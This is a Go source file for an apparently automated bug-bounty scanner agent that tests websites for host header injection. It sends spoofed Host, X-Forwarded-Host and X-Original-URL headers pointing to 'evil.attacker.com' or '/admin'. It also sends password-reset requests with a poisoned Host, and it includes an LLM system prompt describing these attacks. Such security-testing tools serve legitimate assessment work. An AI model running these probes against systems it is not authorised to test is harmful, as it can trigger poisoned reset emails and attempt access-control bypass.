// Package hostheader implements the Host Header Injection specialist agent.
//
// Tests for password reset poisoning, cache poisoning via X-Forwarded-Host,
// SSRF via Host header manipulation, internal vhost routing bypass, and
// URL parser confusion attacks.
package hostheader

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// Agent implements the Specialist interface for host header injection detection.
type Agent struct{}

// New creates a new Host Header Injection specialist agent.
func New() *Agent { return &Agent{} }

func (a *Agent) Name() string         { return "Host Header Injection Agent" }
func (a *Agent) ID() string           { return "hostheader" }
func (a *Agent) SystemPrompt() string { return systemPrompt }

// probe describes one host header injection test
type probe struct {
	name        string
	header      string
	value       string
	description string
	severity    string
}

// ProcessItem tests a target for host header injection vulnerabilities.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}

	client := newClient()
	var findings []*base.Finding

	// Baseline response for comparison
	baseline, err := getBaseline(ctx, client, targetURL)
	if err != nil {
		return nil, nil
	}

	attackHost := "evil.attacker.com"

	probes := []probe{
		{name: "Host header injection", header: "Host", value: attackHost,
			description: "Direct Host header replacement", severity: "high"},
		{name: "X-Forwarded-Host injection", header: "X-Forwarded-Host", value: attackHost,
			description: "Proxy host override via X-Forwarded-Host", severity: "high"},
		{name: "X-Host injection", header: "X-Host", value: attackHost,
			description: "Non-standard X-Host header", severity: "medium"},
		{name: "X-Original-Host injection", header: "X-Original-Host", value: attackHost,
			description: "X-Original-Host override", severity: "medium"},
		{name: "X-Rewrite-URL injection", header: "X-Rewrite-URL", value: "/admin",
			description: "Internal URL rewriting bypass", severity: "high"},
		{name: "X-Original-URL injection", header: "X-Original-URL", value: "/admin",
			description: "Nginx X-Original-URL bypass", severity: "high"},
		{name: "X-Custom-IP-Authorization", header: "X-Custom-IP-Authorization", value: "127.0.0.1",
			description: "IP allowlist bypass via custom header", severity: "high"},
		{name: "Forwarded host injection", header: "Forwarded", value: fmt.Sprintf("host=%s", attackHost),
			description: "RFC 7239 Forwarded header injection", severity: "medium"},
		{name: "X-Forwarded-Server injection", header: "X-Forwarded-Server", value: attackHost,
			description: "Server spoofing via X-Forwarded-Server", severity: "low"},
	}

	for _, p := range probes {
		finding := testProbe(ctx, client, targetURL, u.Hostname(), p, baseline)
		if finding != nil {
			findings = append(findings, finding)
		}
	}

	// Test password reset endpoint specifically
	resetEndpoints := []string{
		"/forgot-password",
		"/reset-password",
		"/password-reset",
		"/auth/reset",
		"/api/password-reset",
		"/api/forgot",
		"/account/recover",
	}
	base_ := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	for _, ep := range resetEndpoints {
		if f := testPasswordResetPoisoning(ctx, client, base_+ep, attackHost); f != nil {
			findings = append(findings, f)
		}
	}

	return findings, nil
}

// testProbe sends a request with an injected header and compares to baseline.
func testProbe(ctx context.Context, client *http.Client, targetURL, realHost string, p probe, baseline probeResult) *base.Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner/1.0)")
	req.Header.Set(p.header, p.value)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	b, _ := io.ReadAll(io.LimitReader(resp.Body, 16*1024))
	body := string(b)
	lBody := strings.ToLower(body)

	// Detection heuristics:
	// 1. Attacker domain reflected in response body
	attackReflected := strings.Contains(body, p.value) && p.value == "evil.attacker.com"

	// 2. Different status code from baseline (e.g., 200 vs 302, admin page access)
	statusChanged := baseline.statusCode != resp.StatusCode

	// 3. Response body significantly different (admin content, different page)
	sizeDiff := abs(len(body)-baseline.bodyLen) > 500

	// 4. Admin/internal content indicators
	adminIndicators := []string{"admin", "dashboard", "internal", "management", "configuration", "debug"}
	foundAdminContent := false
	if baseline.statusCode != 200 || (baseline.statusCode == 200 && !baseline.hasAdminContent) {
		for _, ind := range adminIndicators {
			if strings.Contains(lBody, ind) {
				foundAdminContent = true
				break
			}
		}
	}

	// 5. URL containing attacker domain in Location header
	locationPoisoned := strings.Contains(strings.ToLower(resp.Header.Get("Location")), strings.ToLower(p.value))

	if !attackReflected && !locationPoisoned && !foundAdminContent && !(statusChanged && sizeDiff) {
		return nil
	}

	severity := p.severity
	conf := 0.65

	if attackReflected || locationPoisoned {
		conf = 0.85
		severity = "high"
	}
	if foundAdminContent && (p.header == "X-Rewrite-URL" || p.header == "X-Original-URL") {
		conf = 0.90
		severity = "critical"
	}

	return &base.Finding{
		Type:       "Host Header Injection — " + p.name,
		URL:        targetURL,
		Parameter:  p.header,
		Payload:    p.value,
		Severity:   severity,
		Confidence: conf,
		Method:     "GET",
		Evidence: map[string]interface{}{
			"request_header":    p.header + ": " + p.value,
			"response_body":     truncate(body, 400),
			"baseline_status":   baseline.statusCode,
			"injected_status":   resp.StatusCode,
			"attack_reflected":  attackReflected,
			"location_poisoned": locationPoisoned,
			"admin_content":     foundAdminContent,
			"description":       p.description,
			"note":              "Host header injection can enable password reset poisoning, cache poisoning, and internal routing bypass",
		},
	}
}

// testPasswordResetPoisoning sends a password reset request with a poisoned Host header.
func testPasswordResetPoisoning(ctx context.Context, client *http.Client, endpoint, attackHost string) *base.Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(`{"email":"victim@example.com"}`))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Host", attackHost)
	req.Header.Set("X-Forwarded-Host", attackHost)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner/1.0)")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	body := string(b)

	// Only flag if endpoint responds (200 or 422) — indicates it exists
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusUnprocessableEntity &&
		resp.StatusCode != http.StatusBadRequest {
		return nil
	}

	// If the attack host is reflected in the response, it's likely poisoned
	if !strings.Contains(body, attackHost) && !strings.Contains(resp.Header.Get("Location"), attackHost) {
		// Soft flag: endpoint exists and accepts POST, needs manual verification
		return &base.Finding{
			Type:       "Potential Password Reset Poisoning",
			URL:        endpoint,
			Parameter:  "Host",
			Payload:    attackHost,
			Severity:   "high",
			Confidence: 0.55,
			Method:     "POST",
			Evidence: map[string]interface{}{
				"injected_headers": fmt.Sprintf("Host: %s\nX-Forwarded-Host: %s", attackHost, attackHost),
				"response_status":  resp.StatusCode,
				"response_body":    truncate(body, 300),
				"note":             "Password reset endpoint exists and accepted request with poisoned Host header — verify if reset link uses attacker-controlled domain",
			},
		}
	}

	return &base.Finding{
		Type:       "Password Reset Poisoning via Host Header",
		URL:        endpoint,
		Parameter:  "Host",
		Payload:    attackHost,
		Severity:   "critical",
		Confidence: 0.88,
		Method:     "POST",
		Evidence: map[string]interface{}{
			"injected_host":    attackHost,
			"response_body":    truncate(body, 400),
			"response_status":  resp.StatusCode,
			"attack_reflected": true,
			"note":             "Attacker domain reflected in password reset response — reset link will point to attacker.com enabling account takeover",
		},
	}
}

// probeResult holds baseline response data for comparison.
type probeResult struct {
	statusCode      int
	bodyLen         int
	body            string
	hasAdminContent bool
}

// getBaseline fetches the baseline response for comparison.
func getBaseline(ctx context.Context, client *http.Client, targetURL string) (probeResult, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return probeResult{}, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner/1.0)")

	resp, err := client.Do(req)
	if err != nil {
		return probeResult{}, err
	}
	defer resp.Body.Close()

	b, _ := io.ReadAll(io.LimitReader(resp.Body, 16*1024))
	body := strings.ToLower(string(b))

	adminIndicators := []string{"admin", "dashboard", "management"}
	hasAdmin := false
	for _, ind := range adminIndicators {
		if strings.Contains(body, ind) {
			hasAdmin = true
			break
		}
	}

	return probeResult{
		statusCode:      resp.StatusCode,
		bodyLen:         len(b),
		body:            body,
		hasAdminContent: hasAdmin,
	}, nil
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func newClient() *http.Client {
	return &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		},
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

const systemPrompt = `You are a Host Header Injection specialist. You test web applications for:

1. Password reset poisoning — injecting attacker.com as Host to poison reset links
2. X-Forwarded-Host cache poisoning — poisoning CDN/proxy cache entries
3. Internal routing bypass — accessing admin panels via Host header manipulation
4. IP allowlist bypass — spoofing internal IPs via forwarding headers

Every finding must include the injected header name, value, and evidence from the response.`
